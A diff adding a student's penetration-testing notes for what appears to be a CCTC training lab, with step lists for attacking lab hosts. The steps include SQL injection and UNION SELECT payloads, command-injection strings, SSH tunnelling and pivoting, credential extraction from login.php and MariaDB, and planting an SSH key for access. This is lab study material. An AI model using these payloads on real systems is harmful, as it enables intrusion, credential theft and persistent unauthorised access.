@@ -1,3 +1,10 @@
+post ex 11
+win ex  6
+recon   4
+sql     4
+lin ex  4
+4
+dev ex  3
 ## PublicFacingWebsite //10.50.15.248
 1. run Http-enum script 
 22,80
@@ -12,14 +19,78 @@
 -> cat /home/student/
 6. post method get the post in dev console copy the raw from the request tab and backspace to / insert login.php? then paste the raw data
 -> used ROT13 to decode password and username
+7. ls /var/tmp
+8. ps -elf
+9. check /etc/rsyslog.d -> check the files in there
+10. uname -a -> checks kernel version all the way to generic. EX. 4.15.0-213-generic
+11. ls -lisa /var/www/html -> how many directories
+12. cat /var/www/html/login.php -> found webuser//sqlpass
+13. mysql --user=webuser --pass=sqlpass -> puts us in MariaDB
+14. use session
+15 show tables;
+16 select * from session_log;
+17. select * from user; -> exit after getting creds and decoding ROT13
+18. for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+    ssh -S /tmp/jmp a@1 -O forward -D 9050
+
+
+
+
+
+
+
+
 
 ## BestWebApp //192.168.28.175
+    2222,8000
 1. ping sweep -> for i script
+2. for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done
+    192.168.28.165
+    22,8888
+3. ssh -S /tmp/jmp a@1 -O forward -D 9050
+4. proxychains nmap 192.168.28.175 and the .165
+5. ssh -S /tmp/jmp a@1 -O forward -L 4000:192.168.28.175:8000
+6. go to browser 127.0.0.1:4000
+7. click around
+8. SQL INJECTION backspace to product=8 or 1=1 till you get more info keep chaning till you get a list to find vulnerable
+9. UNION SELECT to find number of columns  -> UNION SELECT 1,2,3 # -> change golden statement to make it view like we normally see it
+10. GOLDEN STATEMENT UNION SELECT table_name,column_name,table_schema FROM information_schema.columns
+    change to view it better ->   table_schema,column_name,table_name  -> three default databases information_schema, MYSQL, performance_schema
+USER DATABASES GENERATES AT TOP OR BOTTOM -> BUT IGNORE TOP LINE AND DEFAULT 3 DATA BASES
+11. UNION SELECT user_id,name,username FROM siteusers.user
+12. ssh -S /tmp/jmp a@1 -O forward -L 4001:192.168.165:22
+13. ssh -MS /tmp/round user3@127.0.0.1 -p 4001 -fN
+14. ssh -S /tmp/round "randow string" in new terminal to use it to login as user
+
+## RoundSensor //192.168.28.165
+1. ssh -S /tmp/jmp a@1 -O forward -L 4001:192.168.165:22
+2. ssh -MS /tmp/round user3@127.0.0.1 -p 4001 -fN
+3. ssh -S /tmp/round "randow string" in new terminal to use it to login as user
+4. sudo -l
+5. ls /tmp
+6. ls /var/tmp
+7. ps -elf
+8.
+9.
+10.
+11.
+12.
+13.
+14.
+15.
+16.
+17.
 
 
-## RoundSensor
 
-## WindersWorkstation
+
+
+
+
+
+
+
+## WindowsWorkstation
 
 
 CCTC Security
@@ -100,7 +171,59 @@ NOTES
 
 
 
+#### Step 1 ####
+--Port Scanning IP & enumerate--
+nmap -p 80 --script=http-enum <IP address>    (Locates useful libraries that should be looked into)
+                                      /login.php
+                                      /login.html
+                                      /img
+                                      /scripts
 
+#### Step 2 ####
+--Employee Sign In using SQL Injection--    
+bob' OR 1='1 (user & pass)
+
+#cmd injection#
+; find / -name "*.ssh"    (finds ssh keys or location to insert)  Private key is for yourself **PUBLIC KEY IS UPLOADED**
+; ls -la     (lists everything in pwd that could be relevant)
+; whoami     (reveals user logged in as)
+
+#create/upload ssh key#
+lin-ops#  ssh-keygen -t rsa
+lin-ops#  cat /home/student/.ssh/id_rsa.pub
+vulnerable#   mkdir /var/www/.ssh
+vulnerable#   echo "public key" >> /var/www/.ssh/authorized_keys
+vulnerable#   cat /var/ww/.ssh/authorized_keys
+
+
+--URL on certain web links reveals vulnerability to inject--
+URL/<IP address>/login.php?username=bob' OR 1='1&passwd=bob' OR 1='1    (Gather all contents into login.php)
+
+--Upload link reveals that malicious injection could be used--
+
+
+#### Step 3 ####
+-Create Master Socket-
+-IP discovered in /etc/hosts-
+-Enumerate discovered IP-
+-Ping sweep with script-
+
+lin-ops#  ssh -MS /tmp/jump user2@10.50.158.70
+user2@public#  sudo -l
+  ls /var/tmp
+  ls /home
+  ps -elf
+  ls /etc/rsylog.d
+  cat *
+  uname -a   (for kernel version [4.15.0-213-generic])
+  ls -la /var/www/html
+  cat /var/ww/html/login.php   (could provide credentials)
+  mysql --user-webuser --pass=sqlpass
+  use session; 
+  show tables;
+  select * from session_log;
+  select * from user;
+  exit
 
 
 
